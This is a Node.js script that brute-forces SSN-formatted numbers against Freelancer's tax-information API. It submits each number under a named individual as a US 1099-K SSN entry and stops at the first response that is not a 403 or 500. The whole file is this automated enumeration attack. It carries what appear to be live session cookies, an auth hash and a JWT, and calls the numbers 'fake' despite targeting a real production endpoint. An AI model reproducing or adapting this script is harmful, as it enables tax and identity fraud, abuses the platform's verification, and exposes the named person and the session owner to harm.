// npm install axios
//590-00-0000     599-00-0000
const axios = require("axios");
function formatFakeNumber(num) {
  // Creates fake test format: 590-00-0000
  const s = String(num).padStart(9, "0");

  return `${s.slice(0, 3)}-${s.slice(3, 5)}-${s.slice(5)}`;
}

async function submitTaxForm(i) {
  for (let i = 590001000; i <= 599000000; i++) {
    const fakeNumber = formatFakeNumber(i);
    try {
      const url =
        "https://www.freelancer.com/api/users/0.1/self/tax?compact=true&new_errors=true&new_pools=true";

      const payload = {
        country_code: "US",
        name: "matthew blake vandonsel",
        number: fakeNumber,
        type: "us1099k",
        us_tax_subtype: "ssn",
      };

      const headers = {
        accept: "application/json, text/plain, */*",
        "content-type": "application/json",

        // Required auth/session headers
        cookie: `_tracking_session=97dedbc3-0e85-d592-a13a-579820a7a2c7;
  session2=b3906498e7a43b39b2d1b3321535b15d5089d6013e335dcda64cad0e0e5e2ab3ccf564ffbf62cfd3;
  GETAFREE_USER_ID=92708728;
  GETAFREE_AUTH_HASH_V2=OS6s%2FDbjiLh5AUr6pkzECIFd8o5ma6HDBWHez0Rp63g%3D;
  qfence=eyJhbGciOiJIUzI1NiIsInR5cCI6IkZyZWVsYW5jZXJcXEdBRlxcQ29yZVxcSldUXFxKV1QifQ.eyI5MjcwODcyOCI6MTc3ODgyNTQ0OCwic3ViIjoicXVpY2tsb2dpbmZlbmNlIiwiaWF0IjoxNzc4ODI1NDQ4fQ.Gluc5CX5HsBMeVXorkljawMM0M0w9cIxnrUZTRdfNrM;`.replace(/\n/g, ""),

        "freelancer-auth-v2":
          "92708728;OS6s/DbjiLh5AUr6pkzECIFd8o5ma6HDBWHez0Rp63g=",

        "freelancer-app-build-timestamp": "1778793866",
        "freelancer-app-is-installed": "false",
        "freelancer-app-is-native": "false",
        "freelancer-app-locale": "en",
        "freelancer-app-name": "main",
        "freelancer-app-platform": "web",
        "freelancer-app-version":
          "gitRevision=0a71292, buildTimestampInSeconds=1778793866",

        "freelancer-tracking":
          "97dedbc3-0e85-d592-a13a-579820a7a2c7",

        origin: "https://www.freelancer.com",
        referer: "https://www.freelancer.com/user/settings/financials",

        "user-agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
      };

      const response = await axios.post(url, payload, {
        headers,
        withCredentials: true,
      });
      console.log("Number:",fakeNumber);
      console.log("Status:", response.status);
      console.log("Response:", response.data);
      if(response.status==403 || response.status==500)
        continue;
      else
        break;
    } catch (error) {
      if (error.response) {
        console.log("Number:",fakeNumber);
        console.error("Status:", error.response.status);
        console.error("Response:", error.response.data);
      } else {
        console.error(error.message);
      }
    }

    // Optional delay between requests
    await new Promise((resolve) => setTimeout(resolve, 1000));
  }
}

submitTaxForm();